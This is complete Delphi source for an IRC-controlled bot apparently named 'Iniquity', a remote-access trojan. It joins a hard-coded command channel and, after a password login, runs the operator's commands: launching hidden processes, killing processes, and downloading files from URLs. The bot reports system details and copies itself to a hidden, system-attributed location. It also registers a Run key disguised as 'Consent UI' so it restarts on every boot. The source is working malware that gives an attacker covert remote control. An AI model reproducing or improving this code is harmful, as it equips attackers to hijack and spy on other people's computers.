// ---------------------------------------------------------------------------->
//         Iniquity v0.01a, © 2013, ibanez0r,Inc. All Rights Reserved.
//             built with: Embarcadero® Delphi® XE2 Update 3
// ---------------------------------------------------------------------------->

{$define debug}     // calls allocCons for debug logging
{$define noreg}     // prevents autorun
{$define noinstall} // prevents installation routines

program iniquity;

// delphi libs ---------------------------------------------------------------->

uses
  SysUtils, ShellAPI, Classes, Winsock, Windows, WinInet, Registry, DateUtils,
  DCPcrypt2, DCPsha1;

// constants ------------------------------------------------------------------>

const
  lf = #10;
  sp = #32;
  crlf = #13 + #10;
  ver = 'Iniquity v0.01a, © 2013, ibanez0r,Inc. All Rights Reserved.';
  mutexstr = 'm#iIRC';

// variables ------------------------------------------------------------------>

var
  wsadata: twsadata;
  iniqSock: tsocket;
  sin: tsockaddrin;
  wsaready, inchan, connected, shutdown, lgin: boolean;
  wsver: word;
  irecv, port: integer;
  bytbuf: array [0 .. 4096] of ansichar;
  nick, user, host, vhost, sname, servpass, chan, ckey, path, ipath, pwdh,
    ahst: ansistring;
  cchar: ansichar;
  server: pansichar;
  mutex: thandle;
  rkey: hkey;
  si: tstartupinfo;
  pi: tprocessinformation;
  fattr: dword;

// type records --------------------------------------------------------------->


// winsock functions ---------------------------------------------------------->

function stopwsa: integer;
begin
  result := closesocket(iniqSock);
  wsacleanup;
end;

function startwsa: integer;
begin
  wsver := makeword(1, 1);
  result := wsastartup(wsver, wsadata);
  if (result = 0) then
    wsaready := true
  else
    wsaready := false;
end;

function open(port: integer; address: pansichar): integer;
begin
  startwsa;
  if wsaready then
  begin
    iniqSock := socket(pf_inet, sock_stream, getprotobyname('tcp').p_proto);
    sin.sin_family := pf_inet;
    sin.sin_port := htons(port);
    sin.sin_addr.S_addr := inet_addr(address);
    result := connect(iniqSock, sin, sizeof(sin));
  end
  else
    result := SOCKET_ERROR;
end;

function iread(var buff; len: word): integer;
begin
  if wsaready then
    result := recv(iniqSock, buff, len, 0)
  else
    result := SOCKET_ERROR;
end;

function iwrite(data: ansistring): integer;
var
  datasize: integer;
begin
{$ifdef debug}
  writeln('[raw] -> ' + data);
{$endif}
  data := data + crlf;
  datasize := length(data);
  if wsaready then
    result := send(iniqSock, data[1], datasize, 0)
  else
    result := SOCKET_ERROR;
end;

function extracturlfilename(const AUrl: string): string;
var
  i: Integer;
begin
  i := lastdelimiter('/', AUrl);
  result := copy(AUrl, i + 1, Length(AUrl) - (i));
end;

procedure crackurl(const URL: string; out Scheme: word;
  out username, password, host: string; out port: word; out objname: string);
var
  Parts: TURLComponents;
  CanonicalURL: String;
  Size: Cardinal;
begin
  FillChar(Parts, sizeof(TURLComponents), 0);
  Parts.dwStructSize := sizeof(TURLComponents);
  if URL <> '' then
  begin
    Size := 3 * length(URL);
    SetString(CanonicalURL, nil, Size);
    if not InternetCanonicalizeUrl(PChar(URL), PChar(CanonicalURL), Size,
      ICU_NO_META) then
      Size := 0;
    SetLength(CanonicalURL, Size);
    Parts.dwSchemeLength := 1;
    Parts.dwUserNameLength := 1;
    Parts.dwPasswordLength := 1;
    Parts.dwHostNameLength := 1;
    Parts.dwURLPathLength := 1;
    Parts.dwExtraInfoLength := 1;
    InternetCrackUrl(PChar(CanonicalURL), Size, 0, Parts);
  end;
  Scheme := Parts.nScheme;
  SetString(UserName, Parts.lpszUserName, Parts.dwUserNameLength);
  SetString(Password, Parts.lpszPassword, Parts.dwPasswordLength);
  SetString(host, Parts.lpszHostName, Parts.dwHostNameLength);
  port := Parts.nPort;
  SetString(ObjName, Parts.lpszUrlPath, Parts.dwURLPathLength +
    Parts.dwExtraInfoLength);
end;

function visit(const URL: String): integer;
const
  AcceptType: array [0 .. 1] of PChar = ('*/*', nil);
var
  hINet, hConn, hReq: HINTERNET;
  UserName, Password, host, ObjName: String;
  Scheme, port: word;
  ReqFlags, Size: Cardinal;
  Stream: TStringStream;
  Buffer: array[0..255] of Byte;
begin
  result := 0;
  hINet := InternetOpen('Mozila/5.0', INTERNET_OPEN_TYPE_PRECONFIG,
    nil, nil, 0);
  if hINet <> nil then
    try
      CrackURL(URL, Scheme, UserName, Password, host, port, ObjName);
      hConn := InternetConnect(hINet, PChar(host), port, PChar(UserName),
        PChar(Password), INTERNET_SERVICE_HTTP, 0, 0);
      if hConn <> nil then
        try
          ReqFlags := INTERNET_FLAG_RELOAD or INTERNET_FLAG_PRAGMA_NOCACHE or
            INTERNET_FLAG_NO_CACHE_WRITE or INTERNET_FLAG_NO_COOKIES or
            INTERNET_FLAG_NO_UI or INTERNET_FLAG_KEEP_CONNECTION;
          if Scheme = INTERNET_SCHEME_HTTPS then
            ReqFlags := ReqFlags or INTERNET_FLAG_SECURE;
          hReq := HttpOpenRequest(hConn, 'GET', PChar(ObjName), nil, nil,
            @AcceptType[0], ReqFlags, 0);
          if hReq <> nil then
            try
              if HttpSendRequest(hReq, nil, 0, nil, 0) then
              begin
                Stream := TStringStream.Create('');
                try
                  while InternetReadFile(hReq, @Buffer[0], SizeOf(Buffer), Size) and (Size <> 0) do
                    Stream.Write(Buffer[0], Size);
                  Result := length(Stream.DataString);
                finally
                  Stream.Free;
                end;
              end;
            finally
              InternetCloseHandle(hReq);
            end;
        finally
          InternetCloseHandle(hConn);
        end;
    finally
      InternetCloseHandle(hINet);
    end;
end;

function dlfile(const URL: String): integer;
const
  AcceptType: array [0 .. 1] of PChar = ('*/*', nil);
var
  hINet, hConn, hReq: HINTERNET;
  UserName, Password, host, ObjName: String;
  Scheme, port: word;
  ReqFlags, Size: Cardinal;
  Stream: TBytesStream;
  Buffer: array[0..255] of Byte;
begin
  result := 0;
  hINet := InternetOpen('Mozila/5.0', INTERNET_OPEN_TYPE_PRECONFIG,
    nil, nil, 0);
  if hINet <> nil then
    try
      CrackURL(URL, Scheme, UserName, Password, host, port, ObjName);
      hConn := InternetConnect(hINet, PChar(host), port, PChar(UserName),
        PChar(Password), INTERNET_SERVICE_HTTP, 0, 0);
      if hConn <> nil then
        try
          ReqFlags := INTERNET_FLAG_RELOAD or INTERNET_FLAG_PRAGMA_NOCACHE or
            INTERNET_FLAG_NO_CACHE_WRITE or INTERNET_FLAG_NO_COOKIES or
            INTERNET_FLAG_NO_UI or INTERNET_FLAG_KEEP_CONNECTION;
          if Scheme = INTERNET_SCHEME_HTTPS then
            ReqFlags := ReqFlags or INTERNET_FLAG_SECURE;
          hReq := HttpOpenRequest(hConn, 'GET', PChar(ObjName), nil, nil,
            @AcceptType[0], ReqFlags, 0);
          if hReq <> nil then
            try
              if HttpSendRequest(hReq, nil, 0, nil, 0) then
              begin
                Stream := TBytesStream.Create;
                try
                  while InternetReadFile(hReq, @Buffer[0], SizeOf(Buffer), Size) and (Size <> 0) do
                    Stream.Write(Buffer[0], Size);
                  Stream.SaveToFile(extractfilepath(paramstr(0))+extracturlfilename(url));
                  result := stream.size;
                finally
                  Stream.Free;
                end;
              end;
            finally
              InternetCloseHandle(hReq);
            end;
        finally
          InternetCloseHandle(hConn);
        end;
    finally
      InternetCloseHandle(hINet);
    end;
end;

// system info functions ------------------------------------------------------>

function gpcuname: ansistring;
var
  buf: array [0 .. 256] of char;
  bSize: cardinal;
  usrn, pcn: ansistring;
begin
  bSize := sizeof(buf);
  if GetComputerName(buf, bSize) then
    pcn := buf
  else
    pcn := 'unknown';
  if GetUserName(buf, bSize) then
    usrn := buf
  else
    usrn := 'unknown';
  result := usrn + '@' + pcn;
end;

function gwinver: ansistring;
var
  vInfo: tosversionInfo;
  pId, vNum: ansistring;
  key: hkey;
  buf: array [0 .. 255] of char;
  bSize: cardinal;
begin
  vInfo.dwosversioninfosize := sizeof(vInfo);
  getversionex(vInfo);
  case vInfo.dwPlatformId of
    VER_PLATFORM_WIN32_WINDOWS:
      begin
        bSize := sizeof(buf);
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
          'Software\\Microsoft\\Windows\\CurrentVersion', 0, KEY_READ, key)
          = ERROR_SUCCESS) then
        begin
          if (RegQueryValueEx(key, pchar('ProductName'), nil, nil, @buf, @bSize)
            = ERROR_SUCCESS) then
            pId := buf
          else
            pId := 'unknown';
          if (RegQueryValueEx(key, pchar('VersionNumber'), nil, nil, @buf,
            @bSize) = ERROR_SUCCESS) then
            vNum := buf
          else
            vNum := 'unknown';
          RegCloseKey(rkey);
        end;
      end;
    VER_PLATFORM_WIN32_NT:
      begin
        bSize := sizeof(buf);
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
          'Software\\Microsoft\\Windows NT\\CurrentVersion', 0, KEY_READ, key)
          = ERROR_SUCCESS) then
        begin
          if (RegQueryValueEx(key, pchar('ProductName'), nil, nil, @buf, @bSize)
            = ERROR_SUCCESS) then
            pId := buf
          else
            pId := 'unknown';
          if (RegQueryValueEx(key, pchar('CurrentVersion'), nil, nil, @buf,
            @bSize) = ERROR_SUCCESS) then
            vNum := buf
          else
            vNum := 'unknown';
          RegCloseKey(rkey);
        end;
      end;
  end;
  result := pId + ' (version ' + vNum + ')';
end;

function gcpuspd: ansistring;
var
  cMHz: ansistring;
  key: hkey;
  spd: dword;
  spds: cardinal;
begin
  spds := sizeof(spd);
  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0', 0, KEY_READ, key)
    = ERROR_SUCCESS) then
  begin
    if (RegQueryValueEx(key, pchar('~MHz'), nil, nil, @spd, @spds)
      = ERROR_SUCCESS) then
      cMHz := inttostr(spd)
    else
      cMHz := '0';
    RegCloseKey(rkey);
  end;
  result := cMHz + 'MHz';
end;

function gmemstat: ansistring;
var
  memstat: memorystatusex;
begin
  memstat.dwLength := sizeof(memstat);
  if globalmemorystatusex(memstat) then
    result := format('%d/%dMB free (%d%% load)',
      [memstat.ullAvailPhys div 1048576, memstat.ullTotalPhys div 1048576,
      memstat.dwMemoryLoad])
  else
    result := '0/0MB free (0% load)';
end;

function gsysupt: ansistring;
var
  count, freq: int64;
begin
  queryperformancecounter(count);
  queryperformancefrequency(freq);
  if ((count <> 0) and (freq <> 0)) then
  begin
    count := count div freq;
    result := format('%dd, %dhr, %dmin, %dsec', [trunc(count / secsperday),
      hourof(count / secsperday), minuteof(count / secsperday),
      secondof(count / secsperday)]);
  end
  else
    result := 'unknown';
end;

// string functions ----------------------------------------------------------->

function strtok(const s: ansistring; separator: ansichar; var startpos: integer)
  : ansistring;
var
  index: integer;
begin
  result := '';
  while (s[startpos] = separator) and (startpos <= length(s)) do
    startpos := startpos + 1;
  if startpos > length(s) then
    exit;
  index := startpos;
  while (s[index] <> separator) and (index <= length(s)) do
    index := index + 1;
  result := copy(s, startpos, index - startpos);
  startpos := index + 1;
end;

function hash(astr: ansistring): ansistring;
const
  // sha-1 produces a 160bit (20byte) output
  hashsize_bytes = 20;
var
  digest: array [0 .. hashsize_bytes - 1] of byte;
  i: integer;
begin
  with tdcp_sha1.create(nil) do
    try
      init();
      updatestr(astr);
      final(digest[0]);
      result := '';
      for i := 0 to hashsize_bytes - 1 do
        result := result + inttohex((digest[i]), 2);
      result := lowercase(result);
    finally
      free();
    end;
end;

// irc functions -------------------------------------------------------------->

function getnick(str: ansistring): ansistring;
begin
  result := copy(str, 2, pos('!', str) - 2);
end;

function rndnick(len: integer): ansistring;
var
  str: ansistring;
begin
  randomize;
  str := 'abcdefghijklmnopqrstuvwxyz';
  result := '';
  repeat
    result := result + str[random(length(str)) + 1];
  until (length(result) = len);
end;

procedure parseirc(line: ansistring);
var
  tstr: ansistring;
  cline: ansistring;
  ctype: integer;
  csl: tstringlist;
  i: integer;
  hprocess : thandle;
begin
{$ifdef debug}
  writeln('[raw] <- '+line);
{$endif}

  // raw events --------------------------------------------------------------->

  // client registration complete, join command chanel
  if (pos('001 '+nick+' :Welcome to the', line) > 0) then
  begin
    iwrite('JOIN '+chan+sp+ckey);
    iwrite('USERHOST '+nick);
    host := copy(line, pos('@', line)+1, length(line)-pos('@', line)+1);
    sname := copy(line, 2, pos(sp, line)-2);
    writeln('[info] successfully registered on '+sname+' as '+nick+'!'+user+'@'+host);
  end;

  // capture virtual irc host
  if (pos('302 '+nick, line) > 0) then
    vhost := copy(line, pos('@', line)+1, length(line)-pos('@', line)+1);

  // monitor chans we're joining & part force joined chans
  if (pos('353 '+nick, line) > 0) then
  begin
    tstr := copy(line,  pos('#', line), length(line)-pos('#', line));
    tstr := copy(tstr, 0, pos(sp, tstr)-1);
    if (tstr <> chan) then
    begin
      writeln('[error] forcejoined channel '+tstr+', parting...');
      iwrite('PART '+tstr);
    end else
    begin
      writeln('[info] joined channel '+tstr);
      inchan := true;
    end;
  end;

  // nickname in use, generate new random nick
  if (pos('433 * '+nick+' :Nickname is already in use.', line) > 0) then
  begin
    writeln('[error] nick '+nick+' in use, generating new nick...');
    nick := rndnick(6);
    iwrite('NICK :'+nick);
  end;

  // cannot join command chan, limit reached, this creates an infinite loop
  if (pos('471 '+nick+sp+chan+' :Cannot join channel', line) > 0) then
  begin
    writeln('[error] cannot join chan '+chan+', full. retry delay 5 seconds...');
    sleep(5000);
    iwrite('JOIN '+chan+sp+ckey);
  end;

  // cannot join command chan, invite only, this creates an infinite loop
  if (pos('473 '+nick+sp+chan+' :Cannot join channel', line) > 0) then
  begin
    writeln('[error] cannot join chan '+chan+', invite only. retry delay 5 seconds...');
    sleep(5000);
    iwrite('JOIN '+chan+sp+ckey);
  end;

  // banned from command chan, this creates an infinite loop
  if (pos('474 '+nick+sp+chan+' :Cannot join channel', line) > 0) then
  begin
    writeln('[error] cannot join chan '+chan+', banned. retry delay 5 seconds...');
    sleep(5000);
    iwrite('JOIN '+chan+sp+ckey);
  end;

  // cannot join command chan key mismatch, this creates an infinite loop
  if (pos('475 '+nick+sp+chan+' :Cannot join channel', line) > 0) then
  begin
    writeln('[error] cannot join chan '+chan+', key mismatch. retry delay 5 seconds...');
    sleep(5000);
    iwrite('JOIN '+chan+sp+ckey);
  end;

  // misc events -------------------------------------------------------------->

  // admin left channel, set loggedin flag to false
  if (pos(ahst+' PART '+chan, line) > 0) then
  begin
    if lgin then
    begin
      writeln('[info] '+ahst+' left '+chan+', logging admin out...');
      lgin := false;
    end;
  end;

  // admin quit server, set loggedin flag to false
  if (pos(ahst+' QUIT', line) > 0) then
  begin
    if lgin then
    begin
      writeln('[info] '+ahst+' has quit irc, logging admin out...');
      lgin := false;
    end;
  end;

  // admin got kicked from command channel, set loggedin flag to false
  if (pos('KICK '+chan+sp+copy(ahst,0,pos('!', ahst)-1), line) > 0) then
  begin
    if lgin then
    begin
      writeln('[info] '+ahst+' has been kicked from '+chan+', logging admin out...');
      lgin := false;
    end;
  end;

  // rejoin command chan if we are kicked
  if (pos('KICK '+chan+sp+nick, line) > 0) then
  begin
    writeln('[error] kicked from '+chan+', attempting rejoin...');
    // clear inchan flag
    inchan := false;
    // clear loggedin flag
    if lgin then lgin := false;
    iwrite('JOIN '+chan+sp+ckey);
  end;

  // server ping
  if (pos('PING :', line) > 0) then
    iwrite('PONG :'+copy(line, pos('PING :', line)+6, length(line)-6));

  // ctcp events -------------------------------------------------------------->

  // client and chan ctcp ping
  if (pos(':'+#1+'PING', line) > 0) then
    iwrite('NOTICE '+getnick(line)+' :'+#1+'PING '+copy(line, pos(':'+#1+'PING', line)+7, length(line)-7)+#1);

  // client and chan ctcp version
  if (pos(':'+#1+'VERSION', line) > 0) then
    iwrite('NOTICE '+getnick(line)+' :'+#1+'VERSION '+ver+#1);

  // client and chan ctcp time
  if (pos(':'+#1+'TIME', line) > 0) then
    iwrite('NOTICE '+getnick(line)+' :'+#1+'TIME '+FormatDateTime('ddd mmm dd hh:nn:ss yyyy', Now)+#1);

  // client ctcp clientinfo
  if (pos(':'+#1+'CLIENTINFO', line) > 0) then
    iwrite('NOTICE '+getnick(line)+' :'+#1+'CLIENTINFO '+'user: '+gpcuname+', os: '+gwinver+', cpu: '+gcpuspd+', ram: '+gmemstat+', uptime: '+gsysupt+'.'+#1);

  // command events ----------------------------------------------------------->

  // detected admin host sending notice/channel message, parse for commands
  ctype := 0; // reset command type
  if (pos(ahst+' PRIVMSG '+chan, line) > 0) then
    ctype := 1  // message command type
  else if (pos(ahst+' NOTICE '+nick, line) > 0) then
    ctype := 2; // notice command type

  if (ctype > 0) then // if command type has been initialised
  begin

    case ctype of
    // message command
    // copy command section of the line for parsing, cline = .login password
      1: cline := copy(line, pos(chan, line) + length(chan) + 2, length(line) - pos(chan, line) + length(chan) + 2);
    // notice command
    // copy command section of the line for parsing, cline = .login password
      2: cline := copy(line, pos(nick, line) + length(nick) + 2, length(line) - pos(nick, line) + length(nick) + 2);
    end;

    // detected command character at beginning of the line, parse for commands
    if (pos(cchar, cline) = 1) then
    begin
      // remove cmd char from our commandline before parsing
      cline := copy(cline, 2, length(cline) - 1);

      // copy command line into stringlist, csl[0] = command, csl[1+ = params
      csl := tstringlist.create;
      i := 1;
      while (i <= length(cline)) do
        csl.add(strtok(cline, sp, i));

      // commands that will only be parsed if loggedin flag is set
      if lgin then
      begin

        // logout command .logout --------------------------------------------->
        if (csl[0] = 'logout') then
        begin
          writeln('[info] '+ahst+' logged out');
          lgin := false;  // sets logged in flag to false
          iwrite('PRIVMSG '+chan+' :logged out');
        end;

        // system info command .sysinfo --------------------------------------->
        if (csl[0] = 'sysinfo') then
        begin
          writeln('[info] '+ahst+' requested system information, generating report...');
          iwrite('PRIVMSG '+chan+' :system info, user: '+gpcuname+', os: '+gwinver+', cpu: '+gcpuspd+', ram: '+gmemstat+', uptime: '+gsysupt+'.');
        end;

        // die command .die --------------------------------------------------->
        if (csl[0] = 'die') then
        begin
          writeln('[info] '+ahst+' requested shutdown, terminating process...');
          iwrite('QUIT :later bitches o/');
          shutdown := true;
        end;

        // action command .action text ---------------------------------------->
        if (csl[0] = 'action') then
        begin
          if (csl.count <= 1) then exit; // if no params were supplied exit
          tstr := '';
          for i := 1 to csl.count - 1 do
            if (i = csl.Count - 1) then
              tstr := tstr+csl[i]
            else
              tstr := tstr+csl[i]+sp;
          iwrite('PRIVMSG '+chan+' :'+#1+'ACTION '+tstr+#1);
        end;

        // nick command .nick nickname ---------------------------------------->
        if (csl[0] = 'nick') then
        begin
          if (csl.count <= 1) then exit; // if no params were supplied exit
          iwrite('NICK '+csl[1]);
        end;

        // notice command .notice target text --------------------------------->
        if (csl[0] = 'notice') then
        begin
          if (csl.count <= 2) then exit; // if no params were supplied exit
          tstr := '';
          for i := 2 to csl.count - 1 do
            if (i = csl.Count - 1) then
              tstr := tstr+csl[i]
            else
              tstr := tstr+csl[i]+sp;
          iwrite('NOTICE '+csl[1]+' :'+tstr);
        end;

        // message command .msg target text ----------------------------------->
        if (csl[0] = 'msg') then
        begin
          if (csl.count <= 2) then exit; // if no params were supplied exit
          tstr := '';
          for i := 2 to csl.count - 1 do
            if (i = csl.Count - 1) then
              tstr := tstr+csl[i]
            else
              tstr := tstr+csl[i]+sp;
          iwrite('PRIVMSG '+csl[1]+' :'+tstr);
        end;

        // exececute command .exec 0/1 c:\path\file.exe ----------------------->
        // needs to be revised to accept exe parameters
        if (csl[0] = 'exec') then
        begin
          if (csl.count <= 2) then
            exit; // if not enuf params were supplied exit
          // create new detached, high priority process *wink wink*
          zeromemory(@si, sizeof(si));
          zeromemory(@pi, sizeof(pi));
          si.cb := sizeof(tstartupinfo);
          si.dwFlags := STARTF_USESHOWWINDOW;
          if csl[1] = '0' then
            si.wShowWindow := SW_HIDE
          else
            si.wShowWindow := SW_SHOW;
          if createprocess(nil, pchar(csl[2]), nil, nil, false,
            CREATE_NEW_PROCESS_GROUP or HIGH_PRIORITY_CLASS or DETACHED_PROCESS,
            nil, nil, si, pi) then
            iwrite('PRIVMSG '+chan+' :successfully executed '+csl[2]+', (pid: '+inttostr(pi.dwProcessId)+')')
          else
            iwrite('PRIVMSG '+chan+' :failed to execute '+csl[2]+' (error code: '+inttostr(GetLastError())+')');
        end;

        // kill command .kill PID# -------------------------------------------->
        if (csl[0] = 'kill') then
        begin
          if (csl.count <= 1) then exit; // if no params were supplied exit
          hprocess := OpenProcess(PROCESS_TERMINATE, false, cardinal(strtoint(csl[1])));
          if (hprocess <> 0) then
            try
              if Win32Check(Windows.TerminateProcess(hprocess, 0)) then
                iwrite('PRIVMSG '+chan+' :successfully terminated pid '+csl[1])
              else
                iwrite('PRIVMSG '+chan+' :failed to terminated pid '+csl[1]+', (error code:'+inttostr(GetLastError())+')');
            except
              iwrite('PRIVMSG '+chan+' :failed to terminated pid '+csl[1]+', (error code:'+inttostr(GetLastError())+')');
              exit;
            end
          else
            iwrite('PRIVMSG '+chan+' :failed to terminated pid '+csl[1]+', (error code:'+inttostr(GetLastError())+')');
          CloseHandle(hprocess);
        end;

        // open command .open 0/1 target -------------------------------------->
        // needs to be revised to accept more parameters
        if (csl[0] = 'open') then
        begin
          if (csl.count <= 2) then exit; // if no params were supplied exit
          if csl[1] = '1' then
            i := shellexecute(0, 'open', pchar(csl[2]), nil, nil, SW_SHOW)
          else
            i := shellexecute(0, 'open', pchar(csl[2]), nil, nil, SW_HIDE);
          if (i > 32) then
            iwrite('PRIVMSG '+chan+' :successfully opened '+csl[2])
          else
            iwrite('PRIVMSG '+chan+' :unable to open '+csl[2]+', (error code:'+inttostr(i)+')');
        end;

        // visit command .visit url ------------------------------------------->
        if (csl[0] = 'visit') then
        begin
          if (csl.count <= 1) then exit; // if no params were supplied exit
          if (pos('http://', csl[1]) or pos('https://', csl[1]) = 0) then
            begin
              iwrite('PRIVMSG '+chan+' :error, unable to visit '+csl[1]+', protocol not supplied (http/https)');
              exit;
            end;
          try
            i := visit(csl[1]);
          finally
          if (i > 0) then
            iwrite('PRIVMSG '+chan+' :successfully visited '+csl[1]+', '+inttostr(i)+' bytes read')
          else
            iwrite('PRIVMSG '+chan+' :unable to visit '+csl[1]);
          end;
        end;

        // download command .download url ------------------------------------->
        if (csl[0] = 'download') then
        begin
          if (csl.count <= 1) then exit; // if no params were supplied exit
          if (pos('http://', csl[1]) or pos('https://', csl[1]) = 0) then
            begin
              iwrite('PRIVMSG '+chan+' :error, unable to download '+csl[1]+', protocol not supplied (http/https)');
              exit;
            end;
          try
             i := dlfile(csl[1]);     // tested, working, needs error checking added :P
          finally
            if (i > 0) then
              iwrite('PRIVMSG '+chan+' :successfully downloaded '+extracturlfilename(csl[1])+', '+inttostr(i)+' bytes read')
            else
              iwrite('PRIVMSG '+chan+' :unable to download '+extracturlfilename(csl[1]));
          end;
        end;

        // .update             ------------------------------------------------>









      end else // if not lgin
      // commands that will only be parsed if loggedin flag is not set
      begin
        // login command .login password -------------------------------------->
        if (csl[0] = 'login') then
        begin
          if (csl.count <= 1) then exit; // if no password was supplied exit
          if (hash(csl[1]) = pwdh) then // compare password hashes
          begin
            writeln('[info] password matched, '+ahst+' logged in');
            lgin := true; // sets admin loggedin flag to true
            iwrite('PRIVMSG '+chan+' :password accepted, logged in');
          end else
          begin
            iwrite('PRIVMSG '+chan+' :password error, access denied');
            writeln('[error] '+ahst+' entered incorrect password, access denied...');
          end;
        end;
      end;
      csl.free; // free command stringlist
    end;
  end; // end admin command parser


//end leeto irc parser jyeah biatch eat it
end;

// events --------------------------------------------------------------------->

procedure ondata(pbuffer: pansichar; dwsize: dword);
var
  data: ansistring;
  sl: tstringlist;
  i, s: integer;
begin
  // this takes the large chunks of text the ircd sends and chops it up
  // into lines and sends each line 1 by 1 to the ircparser above yo fear it
  sl := tstringlist.create;
  data := string(pbuffer);
  data := trim(data);
  if (length(data) > 0) then
  begin
    s := 1;
    while (s <= length(data)) do
      sl.add(strtok(data, lf, s));
    for i := 0 to sl.count - 1 do
      parseirc(sl[i]);
  end;
  sl.free;
end;

// main loop ------------------------------------------------------------------>

begin
{$ifdef debug}
  allocconsole();
  writeln('[info] console allocated...');
{$endif}

  // setup configuration variables here :D
  //
  writeln('[info] allocating variables...');
  port := 6667; // server port
  server := '123.123.123.123'; // server ip address
  servpass := ''; // server password
  cchar := '.'; // command prefix character
  chan := '#darkside'; // command channel
  ckey := 'darkside'; // command channel key
  ahst := 'ibanez!ibanez@lc1.bay0.hotmail.com'; // admin hostmask
  pwdh := '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'; // sha-1 hash of admin pass
  nick := rndnick(6); // random nickname
  user := rndnick(6); // random username
  ipath := 'D:\dev\projects\iniquity\'; // install path
  path := extractfilepath(paramstr(0)); // current path
  connected := false; // connected to ircd
  shutdown := false; // shutdown the bot
  inchan := false; // in command channel
  lgin := false; // admin login status flag

{$ifndef noinstall}
  // detect new install
  if (ipath <> path) then
  begin
    // copy bot to install path and set attributes to hide from explorer and cmd prompt
    if copyfile(pchar(paramstr(0)), pchar(ipath + extractfilename(paramstr(0))),
      false) then
    begin
      fattr := getfileattributes(pchar(ipath + extractfilename(paramstr(0))));
      if (fattr <> INVALID_FILE_ATTRIBUTES) then
        setfileattributes(pchar(ipath + extractfilename(paramstr(0))),
          fattr or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or
          FILE_ATTRIBUTE_NOT_CONTENT_INDEXED or FILE_ATTRIBUTE_SYSTEM);
      // create new detached, high priority, hidden process *wink wink*
      zeromemory(@si, sizeof(si));
      zeromemory(@pi, sizeof(pi));
      si.cb := sizeof(tstartupinfo);
      si.dwFlags := STARTF_USESHOWWINDOW;
      si.wShowWindow := SW_HIDE
      createprocess(nil, pchar(ipath + extractfilename(paramstr(0))), nil, nil,
        false, CREATE_NEW_PROCESS_GROUP or HIGH_PRIORITY_CLASS or
        DETACHED_PROCESS, nil, nil, si, pi);
      exit;
    end
    else
      writeln('[error] installation failed, executing in ' + path);
  end;
{$endif}

{$ifndef noreg}
  writeln('[info] creating registry autostart entries...');
  if (RegCreateKeyEx(HKEY_CURRENT_USER,
    'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, nil,
    REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, rkey, nil) = ERROR_SUCCESS) then
    RegSetValueEx(rkey, 'Consent UI', 0, REG_SZ, pchar('"' + paramstr(0) + '"'),
      length(paramstr(0)) + 2)
  else
    writeln('[error] unable to create registry autostart entries...');
  RegCloseKey(rkey);
{$endif}

  // this will stop updates if you have not redefined your mutex string!
  writeln('[info] creating mutex...');
  mutex := createmutex(nil, true, mutexstr);
  if (getlasterror = ERROR_ALREADY_EXISTS) then
  begin
    writeln('[error] mutex exists, shutting down...');
    exit;
  end;

  // create endless loop
  writeln('[info] interrogating network conectivity...');
  repeat
    while not internetgetconnectedstate(nil, 0) do
    begin
      writeln('[info] waiting for network, entering infinite loop...');
      repeat
        sleep(10000);
      until internetgetconnectedstate(nil, 0);
    end;
    writeln('[info] connecting to '+server+' on port '+inttostr(port)+'...');
    if (open(port, server) <> SOCKET_ERROR) then
    begin
      connected := true;
      writeln('[info] connected to '+server+' on port '+inttostr(port));
      writeln('[info] sending login credentials...');
      iwrite('PASS '+servpass);
      iwrite('USER '+user+' 0 0 :'+nick);
      iwrite('NICK '+nick);
      irecv := iread(bytBuf, SizeOf(bytBuf));
      while ((irecv > 0) and (irecv <> INVALID_SOCKET)) do
      begin
        ondata(@bytbuf, SizeOf(bytbuf));
        zeromemory(@bytbuf, SizeOf(bytbuf));
        irecv := iread(bytbuf, SizeOf(bytbuf));
      end;
    end else
    begin
      writeln('[error] unable to connect to '+server);
      sleep(10000);
    end;
    if connected then
    begin
      if connected then connected := false;
      if lgin then lgin := false;
      if inchan then inchan := false;
      writeln('[error] socket error, '+server+' disconnected');
    end;
  until shutdown = true;

  writeln('[info] shutting down winsock...');
  stopwsa;

  writeln('[info] destroying mutex...');
  closehandle(mutex);

{$ifdef debug}
  writeln('[info] deallocating console...');
  freeconsole();
{$endif}

// end of program ------------------------------------------------------------->
end.
